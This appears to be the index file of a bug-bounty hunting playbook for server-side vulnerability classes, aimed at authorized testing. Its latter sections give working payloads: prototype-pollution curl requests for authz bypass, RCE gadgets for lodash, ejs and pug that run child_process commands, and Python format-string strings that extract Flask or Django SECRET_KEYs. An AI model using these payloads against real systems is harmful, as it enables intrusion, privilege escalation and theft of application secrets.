# Backend / Server-Side Bug Classes — taxonomy hub

We hunt backend/server-side bugs that chain to ceiling impact — not frontend-only primitives. Every
finding is grounded in a real request/response (no hallucination). This file is the **index**: the
high-payout classes each have a deep playbook; the rest are inline below. Payload strings →
[payloads.md](payloads.md).

## Deep playbooks (open the file for the class you're hunting)
| Class | Playbook | Top paid signal |
|---|---|---|
| SSRF | [ssrf.md](ssrf.md) | Dropbox full-response SSRF $17.5k, GitLab $10k |
| RCE (deserialization, dep-confusion, injection, media, archive, upload) | [rce.md](rce.md) | GitLab archive RCE $33.5k, PayPal dep-confusion $30k |
| SSTI | [ssti.md](ssti.md) | Uber Jinja2 → RCE $10k |
| XXE | [xxe.md](xxe.md) | Mail.ru blind XXE $6k |
| HTTP request smuggling / desync | [request-smuggling.md](request-smuggling.md) | Basecamp H/2 $7.5k, New Relic cred theft $3k |
| Web cache poisoning / deception | [cache-attacks.md](cache-attacks.md) | PayPal cache-poison DoS $9.7k |
| Race conditions / TOCTOU | [race-conditions.md](race-conditions.md) | Cosmos faucet $5k |
| ATO — OAuth/OIDC/SAML/JWT/reset | [auth-attacks.md](auth-attacks.md) | Coinbase $5k, GitLab OAuth SSRF $4k |
| IDOR / BOLA / BFLA | [authz-idor.md](authz-idor.md) | destructive-ID & cross-tenant patterns |
| SQL / NoSQL injection | [sqli.md](sqli.md) | data exfil / auth bypass / →RCE |
| GraphQL | [graphql.md](graphql.md) | introspection→admin-mutation, batching→ATO |
| 401/403 bypass | [bypass-403.md](bypass-403.md) | X-Original-URL / path-encoding to admin |
| CORS / open-redirect / CSRF / XSS→ATO / postMessage / clickjacking | [web-misc.md](web-misc.md) | chain fodder → ATO / PII |
| Mobile (APK/IPA) | [mobile.md](mobile.md) | hidden internal base-URLs + hardcoded keys |

**Cross-cutting:** every request is gated by [scope-guard.md](scope-guard.md); escalate every finding to
its ceiling via [chaining.md](chaining.md); write survivors up via [reporting.md](reporting.md).

## Broken Access Control (BAC) — the umbrella, and where its sub-classes live
"BAC" isn't a separate file here — it's the umbrella term for three sub-classes that each have their own
home, and hunting "BAC" on a target means running all three against every feature, not picking one:
- **BOLA (object-level)** — can this identity reach *this specific record* it shouldn't? → [authz-idor.md](authz-idor.md).
- **BFLA (function-level)** — can this identity reach *this specific action/endpoint* it shouldn't,
  regardless of which record? → [bypass-403.md](bypass-403.md)'s extended technique section, plus
  authz-idor.md's "vertical IDOR / BFLA" entries.
- **Mass assignment (attribute-level)** — can this identity set *fields on a record* it shouldn't be able
  to set, even on its own record? → the inline section above.
A single feature is only BAC-covered once all three angles have been tried against it, not just the one
that felt most obvious.

## Kill list (instant reject, never report alone)
Missing security headers · self-XSS · reflected XSS on logged-out marketing pages · stored XSS w/o
ATO/admin impact · clickjacking w/o sensitive action · CSRF on low-impact actions · rate-limit absence
w/o lockout/financial impact · SPF/DKIM/DMARC · version banners · stack traces alone · open redirect
alone (valid only chained to OAuth/SSO token theft) · default creds on dev with no prod link ·
directory listing w/o sensitive files · "potential/possible" anything.

## Inline classes (no separate file)

### SQLi / NoSQLi
Full playbook (detection ladder per DBMS, WAF bypass, NoSQL operators, →RCE) → [sqli.md](sqli.md).
Fingerprint DBMS manually before sqlmap/ghauri; **prove data exfil** (real rows), not an error string.

### Mass assignment / parameter pollution
Add privileged fields to any create/update body: `role`, `isAdmin`, `isOwner`, `permissions`, `plan`,
`credit`, `balance`, `verified`, `email_verified`, `approved`, `status`. Also try array/object type
confusion and duplicate params (`a=1&a=2`). #1 quiet priv-esc.

### Prototype pollution (Node)
`__proto__` / `constructor.prototype` in JSON merge, query string, form, or deep-clone paths. Detect:
`{"__proto__":{"polluted":"yes"}}` then check a reflected/derived property. Chain to RCE via gadgets
(child_process, lodash, `ejs`/template options) or to authz bypass (pollute `isAdmin`).

### Business logic
Negative/overflow quantities, price/amount tampering, currency swap, step-skipping, coupon/refund/
chargeback abuse, replay of signed requests, workflow state-machine abuse, quantity vs price desync.
Follow the money. Chain with [race-conditions.md](race-conditions.md) for limit-overrun.
- **Fractional-quantity manipulation** — distinct from negative quantities: `quantity=0.001` or other
  non-integer values can round a charge down to near-zero while a full unit still ships/unlocks.
- **Currency-arbitrage via exchange rate** — pay in currency B while the price is displayed/computed in
  currency A; look for a stale or client-influenceable conversion rate that lets you pay less than intended.
- **Subscription/license top-up resets existing expiry** — buying a small additional unit/seat/add-on
  should be additive and independent; test whether it instead incorrectly extends or resets the expiry
  clock of a larger, separately-priced existing entitlement.
- **Content-ownership claiming via re-hosted/cloned source** — any flow that verifies ownership of
  external content (RSS/podcast feed, imported site, uploaded config) by reading a self-declared identifier
  (email, owner field) *from inside the untrusted payload itself*, with no fingerprint/duplicate check
  against the real source: download the victim's real content, edit the embedded identifier to yours,
  re-host it anywhere public, submit that URL — the platform verifies **you**, not the original owner.
  Generalizes to any "claim this via a self-declared field inside re-hostable content" flow.

### Infra & cloud
Cloud ATO via SSRF→IMDS ([ssrf.md](ssrf.md)); S3/GCS/Azure hijack (dangling CNAME, predictable naming) &
subdomain takeover with cookie/SSO scope ([params-takeover.md](params-takeover.md),
[unauth-p1.md](unauth-p1.md)); leaked cloud keys verified live ([js-mining.md](js-mining.md)).

### Secrets & disclosure
Live secrets in JS/git (verify vs issuer API; live=P1, dead=trash), sourcemap-recovered source, `.git`
exposure, leaked Swagger/OpenAPI (full API surface → reverse it), GraphQL introspection enabled.

## Method (per endpoint)
`baseline capture → stable replay → smallest single mutation → compare status/body/timing/side-effect →
expand by bug class`. Never mutate many fields at once (a signer/stateful check hides the real blocker).
Detect with a polyglot/probe, then escalate to the engine-specific exploit and **prove impact** (data out,
command run, foreign record changed, account taken) before it counts.

Record the verdict — positive, negative, or not-applicable, always with evidence — on the feature's
`features.jsonl` row, not just in memory. An evidenced verdict is what makes `covered` real
([coverage-ledger.md](coverage-ledger.md), Rule 10); a mental note that later gets summarized as "checked,
clean" is exactly the shortcut Rule 10 exists to close.

---

## PROTOTYPE POLLUTION DEPTH

### Server-Side Detection
```bash
# Inject into any JSON body that merges/extends objects:
curl -X POST https://target.com/api/settings/update \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer SESSION_TOKEN" \
  -d '{"__proto__":{"polluted":"pptest123"}}'

# Alternative syntax (some parsers block __proto__ but not constructor):
-d '{"constructor":{"prototype":{"polluted":"pptest123"}}}'

# Via query string (qs library, used by Express):
curl "https://target.com/api/data?__proto__[polluted]=pptest123"
curl "https://target.com/api/data?constructor[prototype][polluted]=pptest123"

# Verify: does a subsequent request show the injected property?
# e.g., GET /api/profile returns {"name":"user","polluted":"pptest123"} → confirmed
# Or: does an endpoint that reads a normally-absent property now return the injected value?
```

### Parser Differential (Which Parser Is Vulnerable)
```bash
# JSON.parse() is SAFE — does not prototype-pollute
# Vulnerable parsers: qs, lodash.merge, dot-prop, object-path, deep-extend, hoek
# Test EACH input channel separately:
# 1. JSON body (application/json) → JSON.parse → SAFE (but try constructor syntax)
# 2. Query string → qs parser → VULNERABLE to __proto__ and constructor[prototype]
# 3. Form body (application/x-www-form-urlencoded) → qs → VULNERABLE
# 4. YAML body → js-yaml may be vulnerable depending on version
```

### Prototype Pollution → Privilege Escalation (Authz Bypass)
```bash
# After confirming pollution, find properties that control authz:
# Inject isAdmin:
-d '{"__proto__":{"isAdmin":true}}'
# Inject role:
-d '{"__proto__":{"role":"admin"}}'
# Inject verified or approved:
-d '{"__proto__":{"verified":true,"approved":true,"premium":true}}'
# Then make a request that checks these properties:
curl https://target.com/api/admin/users -H "Authorization: Bearer SESSION_TOKEN"
# If 200 with admin data → prototype pollution → authz bypass → P1
```

### Prototype Pollution → RCE via Gadgets
```bash
# child_process.fork / spawn options pollution:
-d '{"__proto__":{"shell":"/proc/self/exe","argv0":"id","NODE_OPTIONS":"--inspect=0.0.0.0"}}'

# lodash template gadget (lodash < 4.17.21):
-d '{"__proto__":{"sourceURL":"
return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'

# ejs template engine options:
-d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# pug template engine:
-d '{"__proto__":{"line":"console.log(require(\"child_process\").execSync(\"id\").toString())"}}'

# Verify: these gadgets are version-specific — confirm the framework version first
# Use OOB callback (interactsh) instead of direct output for blind RCE confirmation
```

---

## PYTHON FORMAT-STRING INJECTION

### str.format() with User-Controlled Template
```bash
# When user input is used as a Python format string (str.format() or .format(**user)):
# Vulnerable pattern: template = user_input; result = template.format(**context)
# Payload to read Flask/Django SECRET_KEY:
{user.__init__.__globals__[config][SECRET_KEY]}
# Or simpler — read any global:
{user.__init__.__globals__}
# Via attribute chain:
{user.__class__.__mro__[1].__subclasses__()}

# Where to test:
# - Any template-rendering endpoint (email templates, message templates, export formats)
# - Report title / custom message fields
# - Any field where the app says "you can use {name} in your message"

# Test with a simple probe first:
# Send: Hello {self}  — if error reveals an object → vulnerable
# Or: {0.__class__} — if response contains <class 'str'> → confirmed
```

```python
# PoC to extract SECRET_KEY from Django:
# Payload in any format string field:
{0.__init__.__globals__[settings][SECRET_KEY]}
# Or for Flask:
{0.__init__.__globals__[current_app][config][SECRET_KEY]}
```

**Verification:** Response contains the SECRET_KEY value (typically a long random string). Independently validate by generating a signed cookie with the found key. If the signed cookie is accepted → P1 (session forgery + potential RCE via pickle if ViewState-like deserialization is in use).
